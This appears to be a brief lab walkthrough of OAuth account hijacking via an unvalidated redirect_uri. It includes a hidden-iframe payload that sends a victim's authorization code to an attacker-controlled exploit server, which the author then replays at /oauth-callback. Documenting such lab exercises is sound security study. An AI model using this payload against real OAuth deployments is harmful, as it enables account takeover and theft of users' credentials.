\# OAuth account hijacking via redirect\_uri



We set our server as the value of the redirect\_uri parameter.



!\[\[/Screenshots/1-OAuth-account-hijacking-via-redirect\_uri.png]]



In the logs of our server we obtained, as a PoC:



!\[\[/Screenshots/2-OAuth-account-hijacking-via-redirect\_uri.png]]



With the same logic créate a script that we will send to the victim



```js

<iframe src="https://<OAUTH-IP>/auth?client\_id=<YOUR-CLIENT-ID>f\&redirect\_uri=<EXPLOIT-SV>\&response\_type=code\&scope=openid%20profile%20email"hidden="hidden"></iframe>

```



We obtain the victim's code and submit it to /oauth-callback.



!\[\[/Screenshots/3-OAuth-account-hijacking-via-redirect\_uri.png]]



!\[\[/Screenshots/4-OAuth-account-hijacking-via-redirect\_uri.png]]

